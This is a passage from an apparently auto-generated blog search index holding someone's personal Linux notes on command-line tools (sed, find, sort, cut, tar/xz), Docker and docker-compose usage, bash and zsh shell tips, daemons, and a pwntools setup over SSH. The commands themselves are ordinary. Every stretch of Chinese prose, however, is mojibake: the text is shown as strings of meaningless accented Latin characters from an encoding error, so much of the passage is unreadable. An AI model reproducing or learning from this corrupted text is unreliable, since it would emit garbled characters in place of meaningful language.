æœ‰ç¼˜å†çœ‹å§.</li><li>æ–°ä¸œè¥¿: <strong>sed</strong>, stream editor.  è¿˜æœ‰ä¸€ä¸ªed, æ ¹æœ¬ä¸çŸ¥é“æ€ä¹ˆç”¨. <del>è¿™ä¸œè¥¿è¿™ä¸¤å¤©æŠŠèœé¸Ÿæ•™ç¨‹ä¸Šæ‰€æœ‰çš„å‘½ä»¤å…¨çœ‹ä¸€è¾¹å°±è¡Œäº†</del> ä¸Šé¢æ²¡æœ‰.<br><em><strong>rev nl</strong></em>  perror<ul><li>çœŸä¸é”™, ç”¨äº†sedæ¥æ”¹c.cä¸­çš„é¢˜ç›®æ ‡å·, å†æ–¹ä¾¿ä¸€ç‚¹.</li></ul></li><li><code>find</code>çš„åŠŸèƒ½çœŸçš„å¾ˆå¤š, åˆæ˜¯ä¸€ä¸ªç›¸å½“å¼ºå¤§çš„å·¥å…·. e.g. <code>find . -name Makefile</code> </li><li><code>wc</code> å‘½ä»¤, è®¡æ•°æ–‡ä»¶å­—èŠ‚æ•° è¡Œæ•°ç­‰ç­‰.</li><li><code>uniq</code> report repeated lines.</li><li><code>ls -ARl *</code> é€’å½’å±•ç¤ºæ–‡ä»¶å¹¶ä¸”ä¸æ˜¾ç¤º.å’Œ.. è¿˜èƒ½æ˜¾ç¤ºç¬¦å·é“¾æ¥ ä»¥åŠ<code>tree</code>å‘½ä»¤</li><li><code>shuf</code> generate random permutation.</li><li><code>sleep infinity</code> æ‰‹å†Œé‡Œå®Œå…¨æ²¡çœ‹è§è¿™ä¸ªinfinity, ä¸è¿‡ä½œç”¨ä¹Ÿæ˜¾è€Œæ˜“è§äº†.</li><li><code>xargs</code> build and exec commands from standard input.</li><li><code>bat</code> cat(1) clone with syntax highlighting and git integration.</li><li><code>awk</code> <a href="https://www.ibm.com/docs/zh/aix/7.2?topic=awk-command">IBM doc</a> </li><li><code>sort</code> : -k å¯ä»¥æŒ‡å®šè·³è¿‡å‰é¢å‡ ä¸ªå­—ç¬¦. <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">KEYDEF is F[.C][OPTS][,F[.C][OPTS]] <span class="hljs-keyword">for</span> start and stop position, <span class="hljs-built_in">where</span> F is a field number and C<br>       a character position <span class="hljs-keyword">in</span> the field; both are origin 1, and the stop position defaults to the<br>       line<span class="hljs-string">&#x27;s end.</span><br></code></pre></div></td></tr></table></figure></li><li><code>du -sh</code> show directory contents size.</li><li><code>cut</code> : <code>cut -d&#39; &#39;Â -f1Â /proc/uptime</code> ç­‰åŒäº <code>awkÂ &#39;&#123;print $1;&#125;&#39;Â /proc/uptime</code> </li><li><code>xz + tar</code> <ul><li>compress:<code>tar -cf - SalesData | xz -9ze -T0 &gt;SalesData.tar.xz</code><br>or cheaper: <code>tar cfJ output.tar.xz inputfiles</code> </li><li>decompress:<code>tar xf archive.tar.xz</code> </li></ul></li><li></li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ul><li>How to exit the running container? <a href="https://linuxhandbook.com/exit-docker-container/">here</a> : that is pressing <code>ctrl+p &amp;&amp; ctrl+q</code>.</li><li><code>sudo docker exec -it CONTAINER_ID sh</code>  exec: run command in a running container.</li><li><code>docker rm/rmi</code> <code>docker ps -all</code> <code>docker images</code> </li><li>docker <strong>file</strong> <a href="https://docs.docker.com/engine/reference/builder/">reference</a> | docker <strong>compose</strong> <a href="https://docs.docker.com/compose/compose-file/">reference</a> </li><li><code>netstat -antu</code> to check whether some container is using ports or not.</li><li>remove used data: <a href="https://stackoverflow.com/questions/32723111/how-to-remove-old-and-unused-docker-images/32723127#32723127">prune</a> </li><li><a href="https://docs.docker.com/engine/reference/commandline/run/"><code>docker run</code></a> </li><li><code>service docker restart</code> </li><li>docker-compose<ul><li>up = start container, down = remove container</li><li>only after removing container can it rm image. maybe <code>dc container prune</code> </li><li><code>dcc up -d</code> + <code>dcc exec [service name] bash</code>: setup a interactive shell</li></ul></li></ul><ul><li><strong>docker desktop</strong>: BIG FAILURE, gnome desktop environment | KVM in kali is not supported | ubuntu 22.04 wired problem | kali root account cant open docker desktop | kali normal account cant open settings. there are so many problems.</li><li><strong>docker engine</strong>: building and containerizing your application</li><li><strong>docker compose</strong>: defining and running multi-container Docker applications.<ul><li>in one containerâ€™s circumstance, the same as docker engine.</li><li>compose fileâ€™s <a href="https://docs.docker.com/compose/compose-file/">format</a> </li></ul></li><li>expose or publish<ul><li><code>EXPOSE</code> is a way of <strong>documenting</strong></li><li><code>--publish</code> (or <code>-p</code>) is a way of <strong>mapping</strong> a <em>host port</em> to a running <em>container port</em></li></ul></li></ul><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h3 id="Shell-programming"><a href="#Shell-programming" class="headerlink" title="Shell programming"></a>Shell programming</h3><p>å¥½å¤šä¸œè¥¿, çœ‹äº†ä¸‹æ„Ÿè§‰æ›´ä¼šç”¨shelläº†.</p><ul><li>printfä½¿ç”¨ç¤ºä¾‹: <ul><li><code>printf &#39;%d %d %d %d&#39; \&#39;a 3 4 \&#39;a</code> <code>printf &quot;\\$(printf %o 74)&quot;</code> <code>printf &quot;\\x$(printf %x 65)&quot;</code> </li></ul></li><li><a href="https://stackoverflow.com/questions/31255699">double-parenthesis</a> | <a href="https://stackoverflow.com/questions/890262#answer-8339221">&#39;$1 : leading-quote</a> | <strong>condition expr</strong>(bash doc P98) | </li><li>Shell Parameter Expansionæœ‰å­—ç¬¦ä¸²ä¸‹æ ‡ç´¢å¼•.</li><li><code>seq</code> ç”Ÿæˆåºåˆ—.</li><li>dup2å¯ç”¨æ¥å®ç°shellçš„redirection. è¿˜å¯ä»¥æŒ‡å®šfd. å¥½åƒä¹‹å‰çš„ä¸€é¢˜åˆæœ‰æ–°çš„è§£å†³æ–¹æ³•äº†, ä¸è¿‡å¾—ç”¨cæ¥å†™.</li><li>å¼€å¯äº†extglob(zsh) | extglob(bash)ä¹‹å, å¯ä»¥ä½¿ç”¨<code>?*+@!(pattern-list)</code>è¿™äº”ç§.<br>zshè¿˜å¯ä»¥ç”¨<code>^</code>ç­‰ç­‰, <a href="http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Operators">æ–‡æ¡£åœ¨è¿™å„¿</a>.<br>çŸ¥é“è¿™äº›ä¹‹åå°±å¯ä»¥æ›´å¥½çš„filter fileäº†<ul><li><code>rm -r ^(sh|1_sh)</code> </li><li><code>ll ^(|*sh)</code> ä¸¤ä¸ªéƒ½åŠ åªèƒ½è¿™æ ·.</li></ul></li><li><code>cp --preserve=links</code> æˆ–è€… <code>cp -av</code>å°±å¯ä»¥å¤åˆ¶symlinkäº†.<br><code>v</code>åªæ˜¯verboseçš„æ„æ€, <code>a</code>è¦†ç›–äº†ä¸€äº›é€‰é¡¹, ç”¨äºå®Œæ•´çš„å¤åˆ¶æ–‡ä»¶æœ¬èº«. </li><li><code>while [ 1 ]</code>add spaces between <code>1</code>.</li><li>åˆ¤æ–­å­ä¸²: <ul><li><code>$&#123;string##*cd*&#125;</code> è¿™ä¸ª##ä¼šä»stringåˆ é™¤åŒ¹é…å­—ç¬¦ä¸²å°±æŒºç¥å¥‡çš„. å¾—ç”¨<code>[ -z ... ]</code>æ¥åˆ¤æ–­æˆåŠŸ.</li></ul></li><li>backtickåœ¨å‘½ä»¤ä¸­ç›¸å½“äº<code>$()</code>çš„ä½œç”¨.</li><li></li></ul><h3 id="Shell-tips"><a href="#Shell-tips" class="headerlink" title="Shell tips"></a>Shell tips</h3><ul><li>cdâ€™s special function in <mark>zsh</mark>: </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd [ -qsLP ] [ arg ]<br>cd [ -qsLP ] old new   #æ›¿æ¢pathä¸­çš„å­—ç¬¦ä¸²<br>cd [ -qsLP ] &#123;+|-&#125;n    #æ‰“å¼€dirsè¾“å‡ºçš„entry, +-è¡¨ç¤ºé¡ºåº<br></code></pre></div></td></tr></table></figure><ul><li>print:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">print [ -abcDilmnNoOpPrsSz ] [ -u n ] [ -f format ] [ -C cols ]<br>[ -v name ] [ -xX tabstop ] [ -R [ -en ]] [ arg ... ]<br></code></pre></div></td></tr></table></figure><ul><li><code>where</code> and <code>which</code> is the variants of <code>whence</code> </li><li>automatically ls after cd: <code>chpwd() ls</code> â€“ define a function in zsh which chpwd() is always called when there is pwd change. </li><li>Patterns used for filename generation may <strong>end in a list of qualifiers enclosed in parentheses</strong> in zsh. </li></ul><h2 id="Deamon"><a href="#Deamon" class="headerlink" title="Deamon"></a>Deamon</h2><ul><li>pronounciation: /ËˆdiËmÉ™n/</li><li>the parent process is often, but not always, the <em>init</em>  process. often ends with <strong>d</strong> letter.</li><li>deamon exp.: cron | xinetd | </li></ul><h2 id="Coding-in-windows"><a href="#Coding-in-windows" class="headerlink" title="Coding in windows"></a>Coding in windows</h2><h3 id="mount-pwntools"><a href="#mount-pwntools" class="headerlink" title="mount+pwntools"></a>mount+pwntools</h3><p>åœ¨windowsä¸‹ä½¿ç”¨å…±äº«æ–‡ä»¶å¤¹+è£…ä¸Špwntools+sshè¿æ¥kali = ä¸»æœºå†™ä»£ç , å¸¦æœ‰è¡¥å…¨é«˜äº®, sshè¾“å…¥å‘½ä»¤. </p><h3 id="Vscode-ssh"><a href="#Vscode-ssh" class="headerlink" title="Vscode ssh"></a>Vscode ssh</h3><p>æš‚æ—¶è¿˜æ˜¯ä¸ç”¨äº†, è¿™ä¸ªå’Œè™šæ‹Ÿæœºé‡Œçš„vscodeæ’ä»¶å¹¶ä¸ä¸€æ ·. è£…ä¸¤æ¬¡å±å®æ²¡å¿…è¦. code serverå·²ç»è£…ä¸Šäº†, ä¹Ÿä¸çŸ¥é“å“ªé‡Œå¸è½½.</p><p>å·²çœŸé¦™. </p><img src="../../image/linuxçš„ä½¿ç”¨/architecture.png" alt="Architecture diagram" style="zoom:80%;" />]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
